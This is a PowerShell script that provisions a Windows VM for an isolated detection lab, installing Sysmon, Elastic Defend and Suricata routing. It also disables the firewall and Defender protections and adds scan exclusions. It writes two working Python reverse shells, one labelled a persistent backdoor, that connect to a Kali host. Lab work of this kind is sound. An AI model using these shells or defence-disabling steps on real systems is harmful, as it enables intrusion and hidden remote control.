# ── Sécurité Windows ──────────────────────────────────────────────────────
# Désactive le pare-feu (VM de lab isolée). Defender est différent : DisableRealtimeMonitoring
# ne fonctionne pas sur cette image -- bloqué par la Protection contre les falsifications
# (Tamper Protection), activée par défaut et non désactivable en PowerShell (testé en lab le
# 10 juillet 2026 : RealTimeProtectionEnabled reste True après l'appel). L'exclusion de dossier
# fonctionne, elle -- validé avec un vrai fichier EICAR : survit dans un dossier exclu, mis en
# quarantaine en quelques secondes sinon (confirmé par Get-MpThreatDetection). Posée avant toute
# écriture dans ces dossiers pour que rien n'y soit scanné.

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# ── WinRM TrustedHosts ────────────────────────────────────────────────────
# Autorise Kali (10.10.10.10) à se connecter via WinRM pour les transferts SMB.
# Nécessaire même si le transfert passe par SMB : WinRM TrustedHosts conditionne
# aussi la résolution NTLM depuis les hôtes non domaine.
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.10" -Force
Add-MpPreference -ExclusionPath C:\lab
Add-MpPreference -ExclusionPath C:\Users\vagrant\lab

# ── Réseau ────────────────────────────────────────────────────────────────
# Ajoute une route vers le réseau attaquant (10.10.10.0) via la Debian

cmd /c "route add 10.10.10.0 mask 255.255.255.0 10.10.1.1 -p"
netsh advfirewall set allprofiles state off

# ── Reverse shell Python ──────────────────────────────────────────────────
# Script qui se connecte à Kali et exécute les commandes reçues

New-Item -ItemType Directory -Force -Path C:\Users\vagrant\lab | Out-Null

$reverseShell = @"
import socket, subprocess

s = socket.socket()
s.connect(('10.10.10.10', 4444))
while True:
    try:
        cmd = s.recv(1024).decode().strip()
        if not cmd:
            break
        output = subprocess.run(cmd, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    except (ConnectionResetError, BrokenPipeError, OSError):
        break
s.close()
"@
[System.IO.File]::WriteAllText("C:\Users\vagrant\lab\reverse.py", $reverseShell)

# Backdoor pérenne -- même logique, port différent (5555) pour simuler un second accès
$svcShell = @"
import socket, subprocess

s = socket.socket()
s.connect(('10.10.10.10', 5555))
while True:
    try:
        cmd = s.recv(1024).decode().strip()
        if not cmd:
            break
        output = subprocess.run(cmd, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)
    except (ConnectionResetError, BrokenPipeError, OSError):
        break
s.close()
"@
[System.IO.File]::WriteAllText("C:\Users\vagrant\lab\svc.py", $svcShell)

# Lanceur batch -- utilisé par la tâche planifiée (évite les guillemets imbriqués dans schtasks)
[System.IO.File]::WriteAllText("C:\Users\vagrant\lab\launch.bat",
    "C:\Users\vagrant\lab\pyembed\python.exe C:\Users\vagrant\lab\svc.py`r`n")

# Python embarqué (pas d'installation système requise)
(New-Object Net.WebClient).DownloadFile(
    "https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip",
    "C:\Users\vagrant\lab\py.zip"
)
Remove-Item C:\Users\vagrant\lab\pyembed -Recurse -Force -ErrorAction SilentlyContinue
Expand-Archive C:\Users\vagrant\lab\py.zip -DestinationPath C:\Users\vagrant\lab\pyembed -Force

# ── Dossiers collect_alerts ───────────────────────────────────────────────
# Crée les dossiers utilisés par collect_alerts.py
# submissions : les autres stagiaires y déposent leurs payloads
# results     : le script y écrit un rapport JSON par payload exécuté

New-Item -ItemType Directory -Force -Path C:\lab\submissions | Out-Null
New-Item -ItemType Directory -Force -Path C:\lab\results     | Out-Null


# ── Sysmon ────────────────────────────────────────────────────────────────
# Enregistre les événements système détaillés dans le journal Windows

(New-Object Net.WebClient).DownloadFile(
    "https://download.sysinternals.com/files/Sysmon.zip",
    "C:\Sysmon.zip"
)
Add-Type -AssemblyName System.IO.Compression.FileSystem
Remove-Item C:\Sysmon\ -Recurse -Force -ErrorAction SilentlyContinue
[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\Sysmon.zip', 'C:\Sysmon\')
& "C:\Sysmon\Sysmon64.exe" -accepteula -i C:\sysmon-config.xml

# ── Elastic Agent ─────────────────────────────────────────────────────────
# Installe l'agent EDR et l'enrôle dans Fleet

# À partir d'ici, toute erreur arrête le script
$ErrorActionPreference = "Stop"

(New-Object Net.WebClient).DownloadFile(
    "https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-9.4.2-windows-x86_64.zip",
    "C:\elastic-agent-9.4.2-windows-x86_64.zip"
)
Remove-Item C:\elastic-agent-tmp\ -Recurse -Force -ErrorAction SilentlyContinue
[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\elastic-agent-9.4.2-windows-x86_64.zip', 'C:\elastic-agent-tmp\')

# Attend que Fleet Server soit accessible sur le port 8220 (5 min max)
Write-Host "Waiting for Fleet Server..."
$fleetReady = $false
for ($i = 0; $i -lt 60; $i++) {
    if ((Test-NetConnection -ComputerName 10.10.1.1 -Port 8220 -WarningAction SilentlyContinue).TcpTestSucceeded) {
        $fleetReady = $true; break
    }
    Start-Sleep 5
}
if (-not $fleetReady) { throw "Fleet Server not reachable after 300s" }

# Récupère le jeton d'enrôlement pour la politique "Windows Endpoints"
# L'API ne supporte pas le filtre par policy_id en query param -- on filtre côté client
$headers = @{
    "kbn-xsrf"      = "true"
    "Authorization" = "Basic " + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("elastic:vagrant"))
}
$policy = ((Invoke-RestMethod "http://10.10.1.1:5601/api/fleet/agent_policies" -Headers $headers).items |
    Where-Object { $_.name -eq "Windows Endpoints" } | Select-Object -First 1)
if (-not $policy) { throw "Windows Endpoints policy not found" }
$policyId = $policy.id

$token = ((Invoke-RestMethod "http://10.10.1.1:5601/api/fleet/enrollment_api_keys" -Headers $headers).items |
    Where-Object { $_.policy_id -eq $policyId } | Select-Object -First 1).api_key
if ([string]::IsNullOrWhiteSpace($token)) { throw "Enrollment token not found for policy $policyId" }

# Enrôle l'agent dans Fleet et installe Elastic Defend
# --insecure : accepte le certificat auto-signé de Fleet Server (lab uniquement)
& "C:\elastic-agent-tmp\elastic-agent-9.4.2-windows-x86_64\elastic-agent.exe" install `
  --url=https://10.10.1.1:8220 `
  --enrollment-token=$token `
  --insecure --non-interactive

# Route all internet traffic through Debian so Suricata can inspect it.
# Done last -- all provisioning downloads already used the VirtualBox NAT adapter.
cmd /c "route delete 0.0.0.0 mask 0.0.0.0"
cmd /c "route add 0.0.0.0 mask 0.0.0.0 10.10.1.1 -p"
Write-Host "Default route set to Debian (10.10.1.1) -- Suricata will see all traffic"

# Start the alert collector in the background.
# Must run last -- needs the lab folders and Python to be ready.
# -u disables output buffering so the log file updates in real time.
Start-Process -FilePath C:\Users\vagrant\lab\pyembed\python.exe `
  -ArgumentList '-u', 'C:\lab\collect_alerts.py' `
  -WindowStyle Hidden `
  -RedirectStandardOutput C:\lab\collect_alerts.log `
  -RedirectStandardError  C:\lab\collect_alerts_err.log
Write-Host "collect_alerts.py started in background"
